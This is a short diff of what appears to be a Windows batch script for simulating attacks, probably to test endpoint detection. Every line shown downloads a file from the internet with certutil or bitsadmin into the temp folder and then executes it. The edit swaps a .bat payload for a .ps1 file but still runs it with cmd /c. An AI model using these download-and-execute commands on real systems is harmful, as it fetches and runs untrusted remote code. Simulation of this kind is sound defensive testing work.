@@ -3,5 +3,5 @@ timeout /t 10 /nobreak >nul
 certutil.exe -urlcache -f "https://aka.ms/ioavtest" "%Temp%\validatecloud.exe"
 cmd /c "%Temp%\validatecloud.exe"
 timeout /t 10 /nobreak >nul
-bitsadmin /transfer kjninjaDL /download /priority normal https://raw.githubusercontent.com/LearningKijo/ResearchDev/main/DEV/SimulationRepo/dev7.bat %temp%\dev7.bat
-cmd /c "%Temp%\dev7.bat"
+bitsadmin /transfer kjninjaDL /download /priority normal https://raw.githubusercontent.com/LearningKijo/ResearchDev/main/DEV/SimulationRepo/dev7.ps1 %temp%\dev7.ps1
+cmd /c "%Temp%\dev7.ps1"
